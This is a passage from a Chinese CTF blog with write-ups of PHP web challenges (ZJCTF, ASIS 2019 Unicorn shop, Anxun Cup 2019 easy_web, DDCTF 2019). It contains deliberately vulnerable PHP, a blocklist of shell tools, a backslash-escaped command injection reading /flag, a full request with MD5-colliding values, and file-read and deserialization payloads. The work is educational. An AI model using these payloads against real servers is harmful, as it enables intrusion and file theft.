<h2 id="Useless-php"><a href="#Useless-php" class="headerlink" title="Useless.php"></a>Useless.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>简单的反序列化构造</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$password</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$password</span>; </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></div>

<p>得到 <code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; </code></p>
<p>然后结合上面的构造提交</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div></div><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">?text=data://text/plain,welcome%20to%20the%20zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure></div>

<p>回显查看源码得到 flag</p>
<hr>
<h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>参考链接如下<br><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">Unicode等价性浅谈</a><br><a href="https://xz.aliyun.com/t/5402">浅谈Unicode设计的安全性</a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuzhu0j30sl0ewwfs.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuzhu0j30sl0ewwfs.jpg" class="lazyload"></a></p>
<p>如图，说有4条独角兽可以去买，然后显示了序号和价格，选择哪个就输入价格就好了，然后点 <code>Purchase Unicorn</code>，让我想起了以前的做过的题目，但这次不是 <code>unicode</code> 欺骗，是利用<code>Unicode构造等价字符</code>，值得注意的一点是，输入2位以上 或者 浮点型就会报错</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuy4vmj309r05p746.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuy4vmj309r05p746.jpg" class="lazyload"></a></p>
<p>看这个样子就是买第四个独角兽，然后回显flag</p>
<p>然后在<a href="https://www.compart.com/en/unicode/">这个网站</a>找到了</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuyujqj30tn0i0t9j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexuyujqj30tn0i0t9j.jpg" class="lazyload"></a></p>
<p>然后提交到之后，就回显flag了</p>
<hr>
<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>题目的URL 让我想到了<a href="https://www.suk1.top/2019/04/18/DDctf2019/#Web-01-%E6%BB%B4">弟弟吹头发的题目</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</span><br><span class="line">然后将中间那段解码</span><br><span class="line">TXpVek5UTTFNbVUzTURabE5qYz0=</span><br></pre></td></tr></table></figure></div>

<p>经过 <code>base64 -&gt; base64 -&gt; hex</code> 得到了 <code>555.png</code><br>因此我们尝试逆推，将 <code>index.php</code> 转换成 <code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code><br>然后提交到URL，得到 <code>index.php</code> 的源码</p>
<h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixi～ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div>

<p>然后查看源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)</span><br></pre></td></tr></table></figure></div>

<p>正则限制许多，但是参考微笑师傅以前写的<a href="https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">命令注入绕过</a>，结合前几天看的<code>CVE-2014-6271</code>，构造如下payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=c\at%20/flag</span><br></pre></td></tr></table></figure></div>

<p>存在md5碰撞</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>]))</span><br></pre></td></tr></table></figure></div>

<p>绕过方法参考 <a href="https://blog.csdn.net/qq_19980431/article/details/83018232">CTF中常见php-MD5()函数漏洞</a></p>
<p>然后用 <code>dir</code> 查看的时候，发现 <code>flag</code> 不在这一目录；</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv00xej314t0i7qaa.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv00xej314t0i7qaa.jpg" class="lazyload"></a></p>
<p>跳转到上一层</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv2swwj316b0hcahm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv2swwj316b0hcahm.jpg" class="lazyload"></a></p>
<p>最后构造Payload：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?cmd=/bin/c\at%20/flag</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>393</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">a<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span></span><br><span class="line"><span class="language-llvm">&amp;b<span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span></span><br></pre></td></tr></table></figure></div>

<p>然后得到flag</p>
<hr>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>新增了陈师傅的友链，以后也要多想大佬学习学习<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg" class="lazyload"></a></p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2019“弟弟吹头发”wp</title>
    <url>/yakko117/2019/04/18/DDctf2019/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这周的比赛没怎么花时间做题，自己还是太菜了，一堆的东西不会</p>
<h2 id="Misc-01-签到题"><a href="#Misc-01-签到题" class="headerlink" title="Misc-01 签到题"></a>Misc-01 签到题</h2><p>真签到题，就在公告里直接复制flag提交就好了</p>
<hr>
<h2 id="Web-01-滴"><a href="#Web-01-滴" class="headerlink" title="Web-01 滴"></a>Web-01 滴</h2><p>查看源码 payload <code>jpg=index.php</code>（TmprMlpUWTBOalUzT0RKbE56QTJPRGN3）</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruwpzdj30n406gaa4.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruwpzdj30n406gaa4.jpg" class="lazyload"></a></p>
<p>获得 <code>base64</code> 的码 </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHANCi8qDQogKiBodHRwczovL2Jsb2cuY3Nkbi5uZXQvRmVuZ0JhbkxpdVl1bi9hcnRpY2xlL2RldGFpbHMvODA2MTY2MDcNCiAqIERhdGU6IEp1bHkgNCwyMDE4DQogKi8NCmVycm9yX3JlcG9ydGluZyhFX0FMTCB8fCB+RV9OT1RJQ0UpOw0KDQoNCmhlYWRlcignY29udGVudC10eXBlOnRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Jyk7DQppZighIGlzc2V0KCRfR0VUWydqcGcnXSkpDQogICAgaGVhZGVyKCdSZWZyZXNoOjA7dXJsPS4vaW5kZXgucGhwP2pwZz1UbXBaTWxGNldYaE9hbU41VWxSYVFrNTZRVEpPZHowOScpOw0KJGZpbGUgPSBoZXgyYmluKGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkX0dFVFsnanBnJ10pKSk7DQplY2hvICc8dGl0bGU+Jy4kX0dFVFsnanBnJ10uJzwvdGl0bGU+JzsNCiRmaWxlID0gcHJlZ19yZXBsYWNlKCIvW15hLXpBLVowLTkuXSsvIiwiIiwgJGZpbGUpOw0KZWNobyAkZmlsZS4nPC9icj4nOw0KJGZpbGUgPSBzdHJfcmVwbGFjZSgiY29uZmlnIiwiISIsICRmaWxlKTsNCmVjaG8gJGZpbGUuJzwvYnI+JzsNCiR0eHQgPSBiYXNlNjRfZW5jb2RlKGZpbGVfZ2V0X2NvbnRlbnRzKCRmaWxlKSk7DQoNCmVjaG8gIjxpbWcgc3JjPSdkYXRhOmltYWdlL2dpZjtiYXNlNjQsIi4kdHh0LiInPjwvaW1nPiI7DQovKg0KICogQ2FuIHlvdSBmaW5kIHRoZSBmbGFnIGZpbGU/DQogKg0KICovDQoNCj8+DQo=</span><br></pre></td></tr></table></figure></div>
<p>然后base64解码，得到waf的源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span></span><br><span class="line"><span class="comment"> * Date: July 4,2018</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~E_NOTICE);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>]))</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>])));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&amp;lt;title&amp;gt;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;jpg&#x27;</span>].<span class="string">&#x27;&lt;/title&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;config&quot;</span>,<span class="string">&quot;!&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&#x27;&lt;/br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line"> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span>.<span class="variable">$txt</span>.<span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Can you find the flag file?</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>看到注释里有个CSDN的博客文章，真的想毒打一顿出题人,我还以为tips在这篇文章，结果不是，在他的另一篇里，我特么…</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9e2jgaj31280ibtky.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9e2jgaj31280ibtky.jpg" class="lazyload"></a></p>
<p>然后Payload： <code>practice.txt.swp</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9e3bkrj30fo04ddfs.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9e3bkrj30fo04ddfs.jpg" class="lazyload"></a></p>
<p>再去 <code>index.php</code> 里 <code>Payload</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">img=f1agconfigddctf.php(要转码)</span><br><span class="line">TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==</span><br></pre></td></tr></table></figure></div>
<p>得到新的 <code>base64</code> 源码</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PD9waHANCmluY2x1ZGUoJ2NvbmZpZy5waHAnKTsNCiRrID0gJ2hlbGxvJzsNCmV4dHJhY3QoJF9HRVQpOw0KaWYoaXNzZXQoJHVpZCkpDQp7DQogICAgJGNvbnRlbnQ9dHJpbShmaWxlX2dldF9jb250ZW50cygkaykpOw0KICAgIGlmKCR1aWQ9PSRjb250ZW50KQ0KCXsNCgkJZWNobyAkZmxhZzsNCgl9DQoJZWxzZQ0KCXsNCgkJZWNobydoZWxsbyc7DQoJfQ0KfQ0KDQo/Pg==</span><br></pre></td></tr></table></figure></div>
<p>解码后为</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="variable">$k</span> = <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$uid</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$content</span>=<span class="title function_ invoke__">trim</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$k</span>));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$uid</span>==<span class="variable">$content</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		